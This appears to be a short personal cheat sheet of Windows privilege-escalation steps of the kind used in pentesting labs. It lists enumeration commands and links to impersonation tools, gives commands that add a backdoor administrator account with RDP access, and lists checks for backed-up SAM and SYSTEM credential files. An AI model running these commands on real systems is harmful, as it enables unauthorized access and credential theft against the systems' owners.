# Windows Privilege Escallation
- [ ] OS and Kernel information: `systeminfo`
- [ ] Current User: `whoami /all`
- [ ] Local Users: `net users`
- [ ] Local Groups: `net localgroup`
- [ ] Network interfaces: `ipconfig`
- [ ] Open Ports: `netstat -ano`
- [ ] `whoami /priv` -> SeImpersonatePrivilege
  - [ ] [PrintSpoofer](https://github.com/itm4n/PrintSpoofer)

# SeImpersonatePrivilege
- [GodPotato](https://github.com/BeichenDream/GodPotato)

---

- Check if there is a port that is open only internally (`netstat –nao`)
- Port forward if there is a new port internally and start checking it from zero
- Creating admin user which has RDP access

```
net user /add haji haji
net localgroup administrators haji /add
net localgroup "Remote Desktop Users" haji /add
```


## Binary Hijacking


## DLL Hijacking


---

```
My first commands I use when getting a Windows shell are below. Enumerate OS etc, check for JuicyPotato, common password locations and running netstat.

systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" 
whoami /priv
netstat –nao
dir C:\Windows\System32\config\RegBack\SAM
dir C:\Windows\System32\config\RegBack\SYSTEM
```
